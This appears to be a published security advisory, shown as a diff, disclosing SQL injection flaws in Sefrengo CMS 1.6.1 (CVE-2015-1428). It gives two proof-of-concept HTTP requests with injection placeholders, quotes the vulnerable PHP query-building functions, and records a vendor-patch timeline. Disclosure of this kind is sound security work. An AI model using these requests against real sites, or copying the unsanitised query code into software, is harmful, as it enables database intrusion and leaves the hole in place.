@@ -1,0 +1,159 @@
+# Exploit Title: Sefrengo CMS v1.6.1 - Multiple SQL Injection Vulnerabilities 
+# Google Dork: N/A
+# Date: 01/26/2015
+# Exploit Author: Nguyen Hung Tuan (tuan.h.nguyen@itas.vn) & ITAS Team (www.itas.vn)
+# Vendor Homepage: http://www.sefrengo.org/ 
+# Software Link: http://forum.sefrengo.org/index.php?showtopic=3368 (https://github.com/sefrengo-cms/sefrengo-1.x/tree/22c0d16bfd715631ed317cc990785ccede478f07)
+# Version: Sefrengo CMS v1.6.1
+# Tested on: Linux
+# CVE : CVE-2015-1428
+
+
+
+::PROOF OF CONCEPT::
+
+Link 1:
+
+
+POST /sefrengo/backend/main.php?idcatside= HTTP/1.1
+Host: itaslab.vn
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://itaslab.vn/sefrengo/backend/main.php
+Cookie: browserspy_js=1; sefrengo=[SQL INJECTION HERE]
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 707
+username=abc&password=abc&Submit=Login+%C2%BB&sid_sniffer=5%2C5%2Ctrue%2Cfalse%2Cfalse%2Cfalse%2
+Ctrue%2Cfalse%2Ctrue%2Ctrue%2Ctrue%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2C
+false%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse
+%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2C1.5%2Ctrue%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse
+%2Cfalse%2Ctrue%2Ctrue%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse
+%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse
+%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Cfalse%2Ctrue%2Ctrue%2Cfalse&response=
+&area=con
+
+
+- Vulnerable file:       /backend/external/phplib/ct_sql.inc
+- Vulnerable function:   function ac_get_value($id, $name)
+- Vulnerable parameter:  $id
+- Vulnerable code: 
+function ac_get_value($id, $name) {
+	global $cms_db;
+    $this->db->query(sprintf("select val from %s where sid  = '%s' and name = '%s'",
+      $cms_db['sessions'],
+      $id,
+      addslashes($name)));
+    if ($this->db->next_record()) {
+      $str  = $this->db->f("val");
+      $str2 = base64_decode( $str );
+
+      if ( ereg("^".$name.":.*", $str2) ) {
+         $str = ereg_replace("^".$name.":", "", $str2 );
+      } else {
+
+        $str3 = stripslashes( $str );
+
+        if ( ereg("^".$name.":.*", $str3) ) {
+          $str = ereg_replace("^".$name.":", "", $str3 );
+        } else {
+
+          switch ( $this->encoding_mode ) {
+            case "slashes":
+              $str = stripslashes($str);
+            break;
+
+            case "base64":
+            default:
+              $str = base64_decode($str);
+          }
+        }
+      };
+      return $str;
+    };
+    return "";
+}
+
+
+
+Link 2:
+
+POST /sefrengo/backend/main.php HTTP/1.1
+Host: research-itasvn.rhcloud.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://itaslab.vn/sefrengo/backend/main.php?area=settings&action=edit&vid=4491
+Cookie: browserspy_js=1; sefrengo=8167bb07461d09b026b28179f7863562
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 112
+value_to_save=45&sefrengo=8167bb07461d09b026b28179f7863562&area=settings&action=save_value&value_id=[SQL INJECTION HERE]&x=6&y=8
+
+
+- Vulnerable file:       /backend/inc/class.values_ct.php
+- Vulnerable function:   function set_value($mixed)
+- Vulnerable parameter:  $mixed['id']
+- Vulnerable code: 
+function set_value($mixed)
+{
+        global $cms_db, $db;
+        //build query
+
+        $sql_group = (empty($mixed['group'])) ? 0: ''.$mixed['group'];
+        $sql_client = (empty($mixed['client'])) ? '': 'AND idclient IN ('. $mixed['client'] .')';
+        $sql_lang = (empty($mixed['lang'])) ? '': 'AND idlang IN ('. $mixed['lang'] .')';
+        $sql_key = (empty($mixed['key'])) ? '': 'AND V.key1 = "'. $mixed['key'] . '" ';
+        $sql_key2 = (empty($mixed['key2'])) ? '': 'AND V.key2 = "'. $mixed['key2'] . '" ';
+        $sql_key3 = (empty($mixed['key3'])) ? '': 'AND V.key3 = "'. $mixed['key3'] . '" ';
+        $sql_key4 = (empty($mixed['key4'])) ? '': 'AND V.key4 = "'. $mixed['key4'] . '" ';
+        $sql_id = (empty($mixed['id'])) ? "": "AND V.idvalues = '". $mixed['id'] . "' ";
+
+
+        $sql = "SELECT 		*
+                        FROM		". $cms_db['values'] ."  AS V
+                        WHERE		V.group_name IN ('$sql_group')
+                        $sql_client $sql_lang
+                        $sql_key  $sql_key2  $sql_key3  $sql_key4 $sql_id";
+
+        //die($sql);
+        $db -> query($sql);
+
+        $count_rows = $db ->num_rows();
+
+        if($count_rows > 1){
+                echo $sql .'<br> Fehler in Klasse "cms_value_ct". Es wurde mehr als ein Ergebnis gefunden. Anfrage ist nicht eindeutig';
+                exit;
+        }
+        elseif($count_rows == 1){
+                $db -> next_record();
+                $mixed['id'] = $db -> f('idvalues');
+                //echo "update";
+                $this -> _update_by_id($mixed);
+        }
+        else{
+                $this -> insert($mixed);
+        }
+
+}
+
+::DISCLOSURE::
++ 01/08/2015: Send the detail of vulnerabilities to vendor and Vendor confirmed
++ 01/25/2015: Vendor releases patch
++ 01/26/2015: ITAS Team publishes information
+
+::REFERENCE::
+- Detail and videos: http://www.itas.vn/news/itas-team-found-out-multiple-sql-injection-vulnerabilities-in-sefrengo-cms-v1-6-1-74.html
+- https://github.com/sefrengo-cms/sefrengo-1.x/commit/22c0d16bfd715631ed317cc990785ccede478f07
+
+
+
+
+::COPYRIGHT::
+Copyright (c) ITAS CORP 2014, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of ITAS CORP.
+
+::DISCLAIMER::
+THE INFORMATION PRESENTED HEREIN ARE PROVIDED ?AS IS? WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO, ANY IMPLIED WARRANTIES AND MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE OR WARRANTIES OF QUALITY OR COMPLETENESS. THE INFORMATION PRESENTED HERE IS A SERVICE TO THE SECURITY COMMUNITY AND THE PRODUCT VENDORS. ANY APPLICATION OR DISTRIBUTION OF THIS INFORMATION CONSTITUTES ACCEPTANCE ACCEPTANCE AS IS, AND AT THE USER'S OWN RISK.
